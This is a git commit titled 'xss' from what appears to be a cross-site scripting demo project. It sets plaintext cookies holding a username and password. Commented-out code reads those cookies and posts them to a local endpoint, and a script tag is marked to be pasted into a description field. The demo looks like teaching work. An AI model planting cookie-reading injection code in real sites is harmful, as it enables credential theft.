23630a04db122a8ecaa3cebee9442300e77d125a
RANIRANI4 <rani.kabbouri4@gmail.com>
2026-04-07 16:16:44 +0200

    xss

--- public/assets/js/script.js
+++ public/assets/js/script.js
@@ -1,15 +1,54 @@
 console.log('hello');
 
+document.cookie = "username=raninnnn";
+document.cookie = "email=rabbbbbbni@zz.fr";
+document.cookie = "password=password";
+
+
+
+
+//
+// function parseCookies() {
+//     const cookieString = document.cookie || "";
+//     return cookieString.split(";").reduce((cookies, pair) => {
+//         const [name, value] = pair.split("=").map(c => c.trim());
+//         if (name) {
+//             cookies[decodeURIComponent(name)] = decodeURIComponent(value || "");
+//         }
+//         return cookies;
+//     }, {});
+// }
+//
+// let dataCookies = parseCookies();
+//
+// const url = "http://localhost:4000/api/auth/register";
+//
+// fetch(url, {
+//     method: 'POST',
+//     headers: {
+//         'Content-Type': 'application/json'
+//     },
+//     body: JSON.stringify({
+//         username: dataCookies['username'],
+//         email: dataCookies['email'],
+//         password: dataCookies['password'],
+//     }),
+// });
+//
+//
+//
+//
+
 
 /** @info
  * A coller dans le input description pour la demo
  * */
 
 // <script>
-//
 // const p = document.querySelectorAll('p');
 //
 // for (const e of p) {
 //     e.style.color = 'red';
 // }
+//
 // </script>
